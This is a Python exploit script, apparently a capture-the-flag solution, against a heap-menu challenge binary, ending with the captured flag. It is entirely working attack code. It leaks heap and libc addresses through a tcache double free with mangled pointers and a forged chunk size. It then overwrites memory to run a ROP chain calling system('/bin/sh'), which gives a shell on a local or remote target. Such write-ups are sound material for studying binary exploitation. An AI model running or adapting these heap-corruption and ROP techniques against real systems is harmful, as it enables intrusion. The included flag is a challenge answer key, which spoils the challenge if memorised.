#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500
brva 0x13E5
brva 0x152C
brva 0x15F5
brva 0x12F3
brva 0x17A5
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'> ', choice)

def alloc(idx: int, data: bytes):
    menu(1)
    slna(b'index : ', idx)
    sa(b'data : ', data)

def free(idx: int):
    menu(3)
    slna(b'index : ', idx)

def view(idx: int):
    menu(2)
    slna(b'index : ', idx)
    ru(b'data : ')
    return rl()[:-1]

def restart(data: bytes):
    menu(4)
    s(data)

# ==================== EXPLOIT ====================
p = start()

for i in range(25):
    alloc(i, b'A')

for i in range(1, 8):
    free(i)

heap = u64(view(1).ljust(0x8, b'\x00')) << 12
slog('heap base @ %#x', heap)

# Double free
free(8)
free(9)
free(8)

for i in range(25, 32):
    alloc(i, b'B')

alloc(32, p64(mangle(heap, heap+0x290)))
alloc(33, b'B')
alloc(34, b'B')
alloc(35, p64(0) + p64(0x461))

free(0)
libc.address = u64(view(0).ljust(0x8, b'\x00')) - 0x21ace0
slog(b'libc base @ %#x', libc.address)

restart(b'reset index')

for i in range(237):
    alloc(i, bytes(f'{i:x}', 'ascii'))

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

free(236)
restart(b'A' * 0x100 + p64(heap+0x5000 - 0x20))
alloc(236, p64(0) + flat(
    pop_rdi, next(libc.search(b'/bin/sh\x00')),
    ret, libc.sym.system
))

sla(b'> ', b'.') # return

interactive()
# DH{7Lu17IyT6riw7Lu17IyT6riw7Lu17IyT6riw7Lu17IyT6riw}
